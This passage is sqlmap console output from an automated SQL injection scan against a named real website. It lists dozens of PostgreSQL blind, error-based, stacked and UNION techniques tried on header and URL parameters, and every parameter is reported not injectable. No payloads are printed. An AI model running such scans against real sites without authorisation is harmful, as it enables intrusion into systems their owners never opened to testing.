[09:36:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[09:37:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[09:37:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:38:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:38:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[09:38:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[09:38:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[09:38:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:38:45] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[09:38:45] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[09:38:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[09:38:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[09:38:46] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[09:39:16] [INFO] testing 'Generic inline queries'
[09:39:16] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[09:39:45] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[09:40:27] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[09:40:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[09:40:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[09:40:36] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[09:40:36] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[09:40:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[09:40:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[09:40:38] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[09:40:54] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[09:41:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:41:28] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[09:41:48] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[09:41:49] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[09:41:49] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[09:41:50] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[09:41:51] [INFO] testing 'PostgreSQL inline queries'
[09:41:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:42:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[09:42:34] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[09:42:43] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[09:43:18] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[09:43:48] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[09:44:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:44:46] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[09:45:09] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[09:45:27] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[09:45:37] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[09:46:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[09:46:46] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[09:47:13] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[09:47:38] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[09:47:38] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[09:47:38] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[09:47:39] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[09:47:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[09:48:23] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[09:48:49] [WARNING] parameter 'User-Agent' does not seem to be injectable
[09:48:49] [INFO] testing if parameter 'Referer' is dynamic
[09:48:57] [WARNING] parameter 'Referer' does not appear to be dynamic
[09:48:57] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[09:48:57] [INFO] testing for SQL injection on parameter 'Referer'
[09:48:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:49:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[09:50:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[09:51:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:51:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[09:51:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[09:52:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[09:52:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[09:52:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:52:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[09:52:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[09:52:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[09:52:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[09:52:26] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[09:52:47] [INFO] testing 'Generic inline queries'
[09:52:47] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[09:53:14] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[09:53:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[09:53:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[09:53:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[09:53:52] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[09:53:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[09:53:53] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[09:53:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[09:54:02] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[09:54:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[09:54:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[09:55:05] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[09:55:18] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[09:55:18] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[09:55:19] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[09:55:19] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[09:55:20] [INFO] testing 'PostgreSQL inline queries'
[09:55:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[09:55:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[09:56:08] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[09:56:30] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[09:57:11] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[09:57:18] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[09:57:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[09:57:52] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[09:58:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[09:58:54] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[09:59:12] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[09:59:37] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[09:59:59] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[10:00:11] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[10:00:28] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[10:00:28] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[10:00:29] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[10:00:37] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[10:00:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:01:37] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[10:02:21] [WARNING] parameter 'Referer' does not seem to be injectable
[10:02:21] [INFO] testing if parameter 'Host' is dynamic
[10:02:21] [WARNING] parameter 'Host' does not appear to be dynamic
[10:02:21] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[10:02:21] [INFO] testing for SQL injection on parameter 'Host'
[10:02:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:03:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[10:04:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[10:05:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:06:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:06:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:06:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[10:06:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[10:06:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:06:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[10:06:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[10:06:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[10:06:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[10:06:59] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[10:07:37] [INFO] testing 'Generic inline queries'
[10:07:38] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:08:32] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[10:09:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[10:09:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[10:09:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[10:09:40] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[10:09:41] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:09:42] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[10:09:44] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[10:09:52] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[10:10:15] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[10:10:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:11:24] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[10:11:51] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:11:51] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[10:11:59] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[10:11:59] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[10:12:00] [INFO] testing 'PostgreSQL inline queries'
[10:12:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:12:09] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[10:12:21] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:12:37] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[10:13:03] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[10:13:14] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[10:13:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:14:12] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[10:14:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[10:15:13] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[10:15:31] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:16:20] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[10:16:39] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[10:17:05] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[10:17:25] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[10:17:25] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[10:17:25] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[10:17:26] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[10:17:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:17:37] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[10:17:54] [WARNING] parameter 'Host' does not seem to be injectable
[10:17:54] [ERROR] all tested parameters do not appear to be injectable, skipping to the next target
[10:17:54] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1542 times, 400 (Bad Request) - 1542 times
[4/5] URL:
GET https://www.mustso.org.tr/DesktopModules/ProModules/ImageChallenge.captcha.aspx?captcha=5F60F1D8A933A0C7052A8B7DF1F6D4C5C0D3F258C4AAD1A9EC0E0AC3B798D34BF284CB60E56BBF551CDA1E456DBD0FD9BBEBDF816B20669C07FD03CB142A6E5BB4F6646CA20D4FB37617AEF68B5C0BF7ED3A645C22BC156B2CD17E145C9F58C3BA709D118AD8C4BF419673259C848133F07F78DEF47095230FBEEBE16BB3DF4ABEEC92DF945B5DE045CFE54CE874A5717910BB39CF0E3C91059F453E551D7555AD1CD4EE&alias=www.mustso.org.tr
do you want to test this URL? [Y/n/q]
>

[10:17:54] [INFO] testing URL 'https://www.mustso.org.tr/DesktopModules/ProModules/ImageChallenge.captcha.aspx?captcha=5F60F1D8A933A0C7052A8B7DF1F6D4C5C0D3F258C4AAD1A9EC0E0AC3B798D34BF284CB60E56BBF551CDA1E456DBD0FD9BBEBDF816B20669C07FD03CB142A6E5BB4F6646CA20D4FB37617AEF68B5C0BF7ED3A645C22BC156B2CD17E145C9F58C3BA709D118AD8C4BF419673259C848133F07F78DEF47095230FBEEBE16BB3DF4ABEEC92DF945B5DE045CFE54CE874A5717910BB39CF0E3C91059F453E551D7555AD1CD4EE&alias=www.mustso.org.tr'
you have not declared cookie(s), while server wants to set its own ('.ASPXANONYMOUS=I3K3yq3v2AE...hZWUwYzAx0'). Do you want to use those [Y/n] y
[10:28:44] [INFO] testing if the target URL content is stable
[10:28:44] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[10:28:44] [INFO] testing if GET parameter 'captcha' is dynamic
[10:28:45] [WARNING] GET parameter 'captcha' does not appear to be dynamic
[10:28:45] [WARNING] heuristic (basic) test shows that GET parameter 'captcha' might not be injectable
[10:28:45] [INFO] testing for SQL injection on GET parameter 'captcha'
[10:28:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:29:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[10:29:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[10:30:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:31:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[10:31:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[10:31:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[10:31:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[10:31:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:31:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[10:31:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[10:32:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[10:32:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[10:32:06] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[10:32:26] [INFO] testing 'Generic inline queries'
[10:32:26] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[10:32:48] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[10:33:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[10:33:31] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[10:33:32] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[10:33:32] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[10:33:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[10:33:33] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[10:33:42] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[10:33:42] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[10:33:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[10:34:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:34:36] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[10:34:56] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[10:34:56] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[10:34:56] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[10:34:57] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[10:34:57] [INFO] testing 'PostgreSQL inline queries'
[10:34:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:34:57] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[10:35:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[10:35:34] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[10:35:50] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[10:36:24] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[10:36:42] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[10:37:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:37:26] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[10:37:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[10:38:14] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[10:38:33] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[10:38:58] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[10:39:58] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[10:40:10] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[10:40:36] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[10:40:36] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[10:40:36] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[10:40:37] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[11:29:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:29:53] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[11:30:22] [WARNING] GET parameter 'captcha' does not seem to be injectable
[11:30:22] [INFO] testing if GET parameter 'alias' is dynamic
[11:30:22] [WARNING] GET parameter 'alias' does not appear to be dynamic
[11:30:22] [WARNING] heuristic (basic) test shows that GET parameter 'alias' might not be injectable
[11:30:23] [INFO] testing for SQL injection on GET parameter 'alias'
[11:30:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:30:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[11:31:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[11:32:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:32:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:33:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:33:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[11:33:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[11:33:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:33:13] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[11:33:13] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[11:33:13] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[11:33:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[11:33:14] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[11:33:33] [INFO] testing 'Generic inline queries'
[11:33:34] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[11:33:47] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[11:34:34] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[11:34:34] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[11:34:34] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[11:34:35] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[11:34:35] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[11:34:36] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[11:34:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[11:34:37] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[11:34:52] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[11:35:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:35:33] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[11:35:53] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[11:35:54] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[11:35:54] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[11:35:55] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[11:35:56] [INFO] testing 'PostgreSQL inline queries'
[11:35:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:36:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[11:36:17] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[11:36:31] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[11:36:59] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[11:37:15] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[11:37:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[11:38:07] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[11:38:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[11:39:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[11:39:21] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[11:39:52] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[11:40:08] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[11:40:41] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[11:41:06] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[11:41:07] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[11:41:07] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[11:41:08] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[11:41:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[11:42:08] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[11:42:53] [WARNING] GET parameter 'alias' does not seem to be injectable
[11:42:53] [INFO] testing if parameter 'User-Agent' is dynamic
[11:43:01] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[11:43:01] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[11:43:01] [INFO] testing for SQL injection on parameter 'User-Agent'
[11:43:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:43:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[11:44:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[11:44:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:45:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[11:45:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[11:45:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[11:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[11:46:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:46:06] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[11:46:06] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[11:46:07] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[11:46:07] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[11:46:08] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[11:46:20] [INFO] testing 'Generic inline queries'
[11:46:20] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[11:47:02] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[11:47:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[11:47:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[11:47:47] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[11:47:47] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[11:47:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[11:47:48] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[11:47:49] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[11:47:49] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[11:47:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[11:48:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:48:56] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[11:49:16] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[11:49:16] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[11:49:16] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[11:49:17] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[11:49:17] [INFO] testing 'PostgreSQL inline queries'
[11:49:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:49:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[11:50:10] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[11:50:19] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[11:50:54] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[11:51:03] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[11:51:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[11:52:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[11:52:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[11:53:07] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[11:53:17] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
